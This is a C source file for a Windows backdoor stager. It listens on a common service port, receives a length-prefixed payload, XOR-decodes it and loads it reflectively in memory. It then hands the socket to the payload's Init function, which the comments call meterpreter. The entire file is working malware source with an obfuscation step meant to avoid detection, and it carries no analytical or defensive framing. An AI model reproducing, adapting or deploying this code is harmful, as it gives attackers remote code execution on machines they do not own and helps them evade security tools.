#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#include "LoadLibraryR.h"
#include "GetProcAddressR.h" 

#pragma comment(lib, "ws2_32.lib")

#define USEXOR 1
WSADATA wsa;

int initwsa();
void xor(char *, int);
DWORD WINAPI handleclient(LPVOID);

/* setting up the meterpreter init function */
typedef DWORD (__cdecl * MyInit) (SOCKET fd);
MyInit meterpreterstart;

/*
http://www.tenouk.com/Winsock/Winsock2example2.html
http://cs.baylor.edu/~donahoo/practical/CSockets/winsock.html
*/
int CALLBACK WinMain(_In_  HINSTANCE hInstance,_In_  HINSTANCE hPrevInstance,_In_  LPSTR lpCmdLine,_In_  int nCmdShow){
	SOCKET ListenSocket;
	struct sockaddr_in service;
	SOCKET AcceptSocket;
	DWORD  threadid;
	int ports[] = {3389,53,88,389,80,443,21,22,23,3306,8080,8443,137,138,139,445};
	int i = 0;

	initwsa();
	ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ListenSocket == INVALID_SOCKET){
		exit(0);
	}

	
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = inet_addr("0.0.0.0");
	for(i=0;i<(sizeof(ports)/sizeof(ports[0]));i++){
	
		service.sin_port = htons(ports[i]);

		if (bind(ListenSocket, (SOCKADDR*) &service, sizeof(service)) == SOCKET_ERROR){
			exit(0);
		}

		if (listen(ListenSocket, 10) == SOCKET_ERROR){
			exit(0);
		}
		break;
	}

	
	while(1){
		AcceptSocket = SOCKET_ERROR;
		while(AcceptSocket == SOCKET_ERROR){
			AcceptSocket = accept(ListenSocket, NULL, NULL);
		}
		
		CreateThread(NULL,0,handleclient,(LPVOID)AcceptSocket,0,&threadid);
	  }
	return 0;
}

DWORD WINAPI handleclient(LPVOID clientsocket){
	int response = 0;
	int total = 0;
	char *payload;
	char recvbuf[1024];
	DWORD payloadlength = 0;
	HMODULE loadedfile = NULL;

	if(initwsa() != 0){
		exit(0);
	}

	response = recv((int)clientsocket, (char *)&payloadlength, sizeof(DWORD), 0);

	payload = (char *)malloc(payloadlength);
	memset(payload,0,payloadlength);
	memset(recvbuf,0,1024);

	do{
		response = recv((int)clientsocket, recvbuf, 1024, 0);
		if(USEXOR){
			xor(&recvbuf[0],response);
		}
		memcpy(payload,recvbuf,response);
		payload += response;
		total += response;
		payloadlength -= response;
		
	}while(payloadlength > 0);
	payload -= total;
	loadedfile = LoadLibraryR(payload,total);
	meterpreterstart = (MyInit) GetProcAddressR(loadedfile,"Init");
	meterpreterstart((int)clientsocket);
	
	free(payload);
}

/* Initialize WSA stuff*/
int initwsa(){
	int wsaerror = 0;
	//wsa is defined above main
	wsaerror = WSAStartup(MAKEWORD(2,2),&wsa);
	if(wsaerror != 0){
		return -1;
	}
	return 0;
}

/*
	Use for additional obfuscation??
	http://stackoverflow.com/questions/12375808/how-to-make-bit-wise-xor-in-c
*/
void xor(char *data,int len){
	int i;
	
	for(i=0;i<len;i++){
		data[i] = data[i] ^ 0x50;
	}
}